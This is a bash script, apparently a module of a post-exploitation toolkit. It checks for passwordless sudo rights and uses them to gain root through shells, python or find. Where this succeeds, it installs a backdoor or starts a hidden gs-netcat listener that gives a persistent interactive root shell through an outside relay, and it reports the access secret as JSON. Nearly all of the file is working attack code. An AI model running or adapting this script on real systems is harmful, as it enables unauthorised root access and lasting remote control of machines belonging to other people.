#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="sudo_nopasswd"
info "Checking sudo permissions..."
sudo_out=$(timeout 3 sudo -n -l 2>/dev/null)
[ -z "$sudo_out" ] && { result_json "$METHOD" "skip" "No sudo access"; exit 1; }
if echo "$sudo_out"|grep -qE '\(ALL.*\)\s*NOPASSWD:\s*ALL'; then
    secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
    sudo -n bash -c "$(declare -f install_gs_backdoor);install_gs_backdoor '$secret'" 2>/dev/null
    result_json "$METHOD" "success" "NOPASSWD ALL" "$secret"; exit 0
fi
for bin in $(echo "$sudo_out"|grep -oP 'NOPASSWD:\s*\K/\S+'); do
    case "$(basename $bin)" in
        bash|sh|zsh|env) sudo -n $bin -c "id">/dev/null 2>&1 && { secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); sudo -n $bin -c "nohup gs-netcat -s '$secret' -l -i &>/dev/null &"; result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
        python*) sudo -n $bin -c 'import os;os.system("id")' 2>/dev/null && { secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); sudo -n $bin -c "import os;os.system(\"nohup gs-netcat -s '$secret' -l -i &>/dev/null &\")"; result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
        find) sudo -n $bin . -exec /bin/sh -c 'id' \; 2>/dev/null && { result_json "$METHOD" "success" "$bin" ""; exit 0; };;
    esac
done
result_json "$METHOD" "fail" "No exploitable sudo"; exit 1
